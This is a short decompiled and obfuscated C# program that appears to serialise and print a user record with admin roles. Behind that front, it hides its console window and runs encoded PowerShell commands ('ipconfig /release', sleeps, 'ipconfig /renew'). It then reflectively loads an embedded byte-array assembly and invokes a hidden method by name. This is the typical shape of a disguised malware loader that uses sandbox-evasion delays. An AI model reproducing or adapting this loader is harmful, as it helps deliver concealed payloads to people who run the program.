using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Reflection;
using ns1;
using ns13;
using ns14;
using ns2;

namespace ns0;

internal static class Class0
{
	private static string GetEmail
	{
		get
		{
			Class131.smethod_310("-enc aQBwAGMAbwBuAGYAaQBnACAALwByAGUAbgBlAHcA");
			Class131.smethod_310("-enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAMQAuADUA");
			Assembly assembly = (Assembly)typeof(Assembly).GetMethod("Load", new Type[1] { typeof(byte[]) })!.Invoke(null, new object[1] { Class131.smethod_39(Class3.Wdsstrxpqjpxmoyooja) });
			Type[] exportedTypes = assembly.GetExportedTypes();
			Type[] array = exportedTypes;
			foreach (Type type in array)
			{
				MethodInfo[] methods = type.GetMethods();
				foreach (MethodInfo methodInfo in methods)
				{
					if (methodInfo.Name == "Yrudamxzvxa")
					{
						return (string)methodInfo.Invoke(null, null);
					}
				}
			}
			return "";
		}
	}

	[STAThread]
	public static void Main()
	{
		Class131.ShowWindow(Process.GetCurrentProcess().MainWindowHandle, 0);
		Class131.smethod_310("-enc aQBwAGMAbwBuAGYAaQBnACAALwByAGUAbABlAGEAcwBlAA==");
		Class131.smethod_310("-enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMgA1AA==");
		Class1 object_ = new Class1
		{
			Email = GetEmail,
			Active = true,
			Roles = new List<string> { "User", "Admin" }
		};
		string value = Class7.smethod_16(object_);
		Console.WriteLine(value);
	}
}
